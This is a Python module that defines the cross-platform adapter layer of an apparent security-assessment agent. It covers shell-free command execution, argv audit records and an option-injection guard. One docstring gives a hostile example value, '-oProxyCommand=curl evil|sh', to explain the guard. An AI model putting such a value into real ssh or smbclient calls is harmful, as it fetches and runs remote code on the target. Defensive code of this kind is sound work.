"""The adapter contract: one semantic verb, three operating systems.

This is the layer that makes the whole design work at 150M parameters.
``enum.persistence`` is a *question* — "what runs without a human starting it?" —
and each adapter answers it in its own idiom: registry Run keys plus scheduled
tasks plus services plus WMI subscriptions on Windows; cron, systemd units and
shell profiles on Linux; launchd plists and login items on macOS. The model
learns the question once. It never learns three dialects, and that is the single
largest capacity saving available to a model this size.

It is also where commands finally run on a real machine, so the safety
properties here are structural rather than advisory.

**No shell, ever.** :func:`run` takes an argument list and passes it to
``subprocess`` with ``shell=False``. There is no code path that concatenates a
parameter into a command string, which means there is no command injection to
find — not because the parameters are sanitised, but because they are never
parsed by a shell in the first place. A verb that seems to need shell syntax
needs two verbs instead.

**The exact argv is recorded.** Every :class:`CommandResult` carries the
argument vector that actually ran, and the executor puts it in the observation,
which the gate writes to the hash-chained audit log. "What did this thing
actually do on my machine" is answerable down to the argv, which is the standard
an autonomous agent with execute rights has to meet.

**Unsupported is an answer, not a failure.** macOS has no registry. Linux has no
WMI. An adapter declining a verb returns an :class:`~whetstone.actions.Observation`
with ``unsupported=True``, which is a fact about the world rather than a bug to
retry — and a distinction the agent loop depends on, since retrying an
impossible action is the cheapest way to burn a turn budget.

**Observations carry structure, not prose.** An adapter returns lists of dicts
with named fields, never a blob of captured stdout. The model has to read these
inside a 1024-token window; ``{"name": "sshd", "state": "running"}`` costs a
fraction of what the equivalent ``systemctl`` banner costs, and it does not
change shape when someone's terminal width does.
"""

from __future__ import annotations

import platform
import shutil
import subprocess
import time
from dataclasses import dataclass, field
from typing import Any, Callable, ClassVar, Iterable, Sequence

from ..actions import Action, Observation, Verb

__all__ = [
    "reject_option_injection",
    "Adapter",
    "CommandResult",
    "AdapterError",
    "run",
    "which",
    "current_platform",
    "get_adapter",
    "register_adapter",
]


class AdapterError(RuntimeError):
    """An adapter could not carry out an action it claimed to support."""


@dataclass(frozen=True, slots=True)
class CommandResult:
    """What one external command did.

    ``argv`` is kept because the audit log needs it: an agent that ran
    ``['launchctl', 'list']`` and an agent that ran something else entirely are
    only distinguishable afterwards if the argument vector was recorded at the
    time.
    """

    argv: tuple[str, ...]
    returncode: int
    stdout: str = ""
    stderr: str = ""
    duration_ms: int = 0
    timed_out: bool = False

    @property
    def ok(self) -> bool:
        return self.returncode == 0 and not self.timed_out

    def lines(self) -> list[str]:
        return [ln for ln in self.stdout.splitlines() if ln.strip()]

    def to_dict(self) -> dict[str, Any]:
        d: dict[str, Any] = {"argv": list(self.argv), "rc": self.returncode,
                             "ms": self.duration_ms}
        if self.timed_out:
            d["timed_out"] = True
        if self.stderr.strip():
            d["stderr"] = self.stderr.strip()[:2000]
        return d


def run(
    argv: Sequence[str],
    *,
    timeout: int = 30,
    stdin: str | None = None,
    check: bool = False,
) -> CommandResult:
    """Run a command with no shell involved.

    ``shell=False`` is not a default that can be overridden here — this function
    takes no ``shell`` parameter, so no caller can enable it. Parameters supplied
    by a model therefore reach ``execve`` as single ``argv`` entries and are
    never parsed as syntax, which removes command injection as a category rather
    than mitigating it.

    A timeout is mandatory and finite. An agent that blocks forever on a command
    waiting for input it will never receive is indistinguishable, from outside,
    from an agent that has finished.
    """
    started = time.perf_counter()
    try:
        proc = subprocess.run(  # noqa: S603 — argv list, shell=False by construction
            list(argv),
            capture_output=True,
            text=True,
            errors="replace",
            timeout=timeout,
            input=stdin,
        )
    except subprocess.TimeoutExpired as exc:
        return CommandResult(
            argv=tuple(argv), returncode=-1,
            stdout=(exc.stdout or "") if isinstance(exc.stdout, str) else "",
            stderr=f"timed out after {timeout}s",
            duration_ms=int((time.perf_counter() - started) * 1000),
            timed_out=True,
        )
    except (FileNotFoundError, PermissionError, OSError) as exc:
        return CommandResult(
            argv=tuple(argv), returncode=-1, stderr=str(exc),
            duration_ms=int((time.perf_counter() - started) * 1000),
        )

    result = CommandResult(
        argv=tuple(argv),
        returncode=proc.returncode,
        stdout=proc.stdout or "",
        stderr=proc.stderr or "",
        duration_ms=int((time.perf_counter() - started) * 1000),
    )
    if check and not result.ok:
        raise AdapterError(f"{' '.join(argv)} failed ({result.returncode}): "
                           f"{result.stderr.strip()[:200]}")
    return result


def reject_option_injection(*values: str) -> None:
    """Refuse argv values a downstream tool would read as an *option*.

    The no-shell design — argv lists, never a command string — removes command
    injection outright. It does not remove OPTION injection. A value like
    ``as_user='-oProxyCommand=curl evil|sh'`` is a single argv entry, but ``ssh``
    and ``smbclient`` parse any argv element beginning with ``-`` as an option
    rather than as a destination, and ``-oProxyCommand`` executes a command.
    Destinations and usernames have no legitimate leading dash, so they are
    refused here rather than passed through.

    This lives in ``base`` because it was previously defined in the Linux
    adapter alone, and the macOS adapter — which builds the same
    ``f"{as_user}@{host}"`` ssh destination — had no guard at all. A safety
    check that exists on one platform and not its sibling is not a safety
    check; it is an accident of which file someone was reading at the time.
    """
    for v in values:
        if v.startswith("-"):
            raise AdapterError(
                f"refusing argument {v!r}: a value beginning with '-' would be "
                "interpreted as a command-line option by the remote-access tool "
                "(option injection). Destinations and usernames must not start "
                "with a dash.")


def which(name: str) -> str | None:
    """Absolute path of an executable, or None.

    Adapters call this before using an optional tool so that "this box does not
    have ``osquery`` installed" degrades to a partial answer instead of an
    exception. Resolving to an absolute path also means the command that runs
    does not depend on whatever ``PATH`` the agent inherited.
    """
    return shutil.which(name)


def current_platform() -> str:
    """``"windows"``, ``"linux"``, ``"macos"``, or the raw platform string."""
    system = platform.system().lower()
    return {"darwin": "macos", "windows": "windows", "linux": "linux"}.get(
        system, system
    )


class Adapter:
    """Base class for a platform's implementation of the verb catalogue.

    Subclasses register handlers with :meth:`implements` rather than a single
    dispatch method, so that "does this platform support this verb" is a lookup
    in a dict built at import time rather than a branch that has to be executed
    to find out. The gate and the prompt builder both need that answer before
    anything runs.
    """

    #: Set by each subclass: ``"windows"``, ``"linux"`` or ``"macos"``.
    platform: ClassVar[str] = ""
    #: verb id -> handler. Populated per-subclass by the decorator below.
    _handlers: ClassVar[dict[str, Callable[[Any, Verb, Action], Any]]]

    def __init_subclass__(cls, **kw: Any) -> None:
        super().__init_subclass__(**kw)
        # Each subclass gets its own table. Sharing one would let the Linux
        # adapter answer for Windows verbs, which is the confused-deputy version
        # of a portability bug and would be found only on the wrong machine.
        cls._handlers = {}

    @classmethod
    def implements(cls, *verb_ids: str) -> Callable[[Callable], Callable]:
        """Register a handler for one or more verbs on this adapter."""
        def decorator(fn: Callable) -> Callable:
            for verb_id in verb_ids:
                if verb_id in cls._handlers:
                    raise AdapterError(
                        f"{cls.__name__} already implements {verb_id!r}"
                    )
                cls._handlers[verb_id] = fn
            return fn
        return decorator

    # ------------------------------------------------------------------ query

    def supports(self, verb_id: str) -> bool:
        return verb_id in self._handlers

    def implemented(self) -> tuple[str, ...]:
        return tuple(sorted(self._handlers))

    # ---------------------------------------------------------------- execute

    def execute(self, verb: Verb, action: Action) -> Observation:
        """Carry out one action. This is the callable the gate submits to.

        Exceptions are converted to failed observations rather than propagating.
        An adapter that raises takes down an agent loop mid-engagement and loses
        the trajectory; an adapter that returns ``ok=False`` with a message lets
        the loop record what happened, feed the error back to the model as a
        correction, and carry on — which is also the behaviour that generates
        training data instead of a stack trace.
        """
        handler = self._handlers.get(verb.id)
        if handler is None:
            return Observation(
                action=action, ok=False, unsupported=True,
                platform=self.platform,
                error=(f"{verb.id} is not implemented on {self.platform}. "
                       f"This may be a fact about the platform rather than a "
                       f"gap — {self.platform} may have no such concept."),
            )

        started = time.perf_counter()
        try:
            data = handler(self, verb, action)
        except AdapterError as exc:
            return Observation(
                action=action, ok=False, platform=self.platform, error=str(exc),
                duration_ms=int((time.perf_counter() - started) * 1000),
            )
        except Exception as exc:                       # noqa: BLE001 — see docstring
            return Observation(
                action=action, ok=False, platform=self.platform,
                error=f"{type(exc).__name__}: {exc}",
                duration_ms=int((time.perf_counter() - started) * 1000),
            )

        # A handler may return a bare payload or an Observation it built itself
        # (needed when it wants to report partial success or set `unsupported`).
        if isinstance(data, Observation):
            return data
        return Observation(
            action=action, ok=True, data=data, platform=self.platform,
            duration_ms=int((time.perf_counter() - started) * 1000),
        )


#: platform name -> adapter class, filled by the platform modules at import.
_REGISTRY: dict[str, type[Adapter]] = {}


def register_adapter(cls: type[Adapter]) -> type[Adapter]:
    """Class decorator: make this adapter the implementation for its platform."""
    if not cls.platform:
        raise AdapterError(f"{cls.__name__} declares no platform")
    _REGISTRY[cls.platform] = cls
    return cls


def get_adapter(name: str | None = None) -> Adapter:
    """The adapter for ``name``, or for the machine this is running on.

    Importing :mod:`whetstone.adapters` registers all three, so a Linux box can
    still introspect the Windows adapter's verb coverage — which is what
    ``whet verbs --platform windows`` and the corpus generator need, and what
    makes cross-platform coverage testable from one machine.
    """
    from . import linux, macos, windows  # noqa: F401 — registration side effect

    target = name or current_platform()
    try:
        return _REGISTRY[target]()
    except KeyError:
        raise AdapterError(
            f"no adapter for platform {target!r}; have "
            f"{', '.join(sorted(_REGISTRY)) or 'none'}"
        ) from None


def coverage() -> dict[str, tuple[str, ...]]:
    """Verb id -> platforms that implement it.

    A verb implemented on one platform and not the others is not necessarily
    wrong — ``enum.shares`` means something different on a Mac than on a domain
    member — but it is worth being able to see at a glance, because the model is
    trained on one action space and will happily propose a verb on a host whose
    adapter cannot carry it out.
    """
    from . import linux, macos, windows  # noqa: F401

    out: dict[str, set[str]] = {}
    for name, cls in _REGISTRY.items():
        for verb_id in cls._handlers:
            out.setdefault(verb_id, set()).add(name)
    return {k: tuple(sorted(v)) for k, v in sorted(out.items())}
